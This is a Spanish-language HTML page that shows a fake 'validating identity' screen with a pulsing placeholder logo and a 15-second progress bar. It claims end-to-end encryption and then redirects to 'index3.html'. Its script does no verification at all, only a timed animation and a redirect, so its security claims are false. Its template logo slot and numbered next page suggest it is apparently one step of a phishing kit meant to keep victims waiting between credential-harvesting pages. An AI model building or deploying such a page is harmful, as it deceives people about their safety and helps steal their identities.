<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificando Información</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { 
            background-image: url('https://i.postimg.cc/DZVgdPhQ/9aa5a26c-780a-444f-acb0-d9c7cfee2bbe.png'); 
            background-size: cover; 
            background-position: center;
            background-attachment: fixed;
            margin: 0;
            height: 100vh;
            overflow: hidden;
        }
        
        body::before {
            content: "";
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.6); 
            z-index: -1;
        }

        .loader-card {
            border-radius: 1.5rem 1.5rem 0 0;
            min-height: 400px;
            z-index: 10;
        }

        /* Animación de pulso profesional */
        .loading-pulse {
            animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: .5; }
        }

        /* Barra de progreso suave */
        .progress-bar {
            width: 0%;
            height: 4px;
            background-color: #ec1c24;
            transition: width 15s linear;
        }
    </style>
</head>
<body class="flex flex-col justify-end">

    <div class="bg-white w-full loader-card p-8 shadow-2xl flex flex-col items-center justify-between">
        <!-- Barra de arrastre -->
        <div class="w-10 h-1 bg-gray-300 rounded-full mb-10"></div>

        <div class="flex-1 flex flex-col items-center justify-center space-y-6">
            <!-- LOGO: Reemplaza con la URL de tu logo -->
            <div class="w-24 h-24 flex items-center justify-center rounded-full bg-gray-50 shadow-inner">
                <img src="https://tse2.mm.bing.net/th/id/OIP.juuzw2xnJ58WEZwWLafBcwHaHa?w=936&h=936&rs=1&pid=ImgDetMain&o=7&rm=3" alt="Logo" class="w-16 h-16 object-contain loading-pulse">
            </div>

            <div class="text-center space-y-2">
                <h2 class="text-xl font-bold text-gray-800">Validando identidad</h2>
                <p class="text-gray-500 text-sm px-10">Estamos procesando tu solicitud de forma segura. Por favor, no cierres esta ventana.</p>
            </div>

         

        <!-- Barra de progreso e indicador de tiempo -->
        <div class="w-full space-y-4 mb-6">
            <div class="w-full bg-gray-100 rounded-full overflow-hidden">
                <div id="bar" class="progress-bar"></div>
            </div>
            <p class="text-center text-[10px] text-gray-400 uppercase tracking-widest font-semibold">Cifrado de extremo a extremo</p>
        </div>
    </div>

    <script>
        window.onload = () => {
            const bar = document.getElementById('bar');
            
            // Inicia la animación de la barra inmediatamente
            setTimeout(() => {
                bar.style.width = '100%';
            }, 100);

            // Redirección tras 15 segundos exactos
            setTimeout(() => {
                window.location.href = "index3.html";
            }, 15000);
        };
    </script>
</body>
</html>
